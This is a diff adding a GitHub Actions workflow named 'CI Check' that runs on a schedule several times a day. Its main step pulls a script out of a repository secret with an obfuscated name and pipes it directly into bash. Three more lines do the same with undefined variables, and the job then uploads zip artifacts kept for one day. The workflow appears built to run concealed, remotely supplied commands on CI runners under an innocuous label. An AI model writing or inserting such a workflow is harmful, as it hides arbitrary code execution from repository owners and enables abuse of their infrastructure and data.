@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          xgvdx63152: ${{ secrets.xgvdx63152 }}
+        run: |
+          printf '%s' "$xgvdx63152" | jq -r .n29314 | /bin/bash
+          printf '%s' "$ssaph98627" | jq -r .b6356 | /bin/bash
+          printf '%s' "$gtix46" | jq -r .a87 | /bin/bash
+          printf '%s' "$kzg20" | jq -r .wd656 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: uDI4teqe
+          path: "*.zip"
+          retention-days: 1
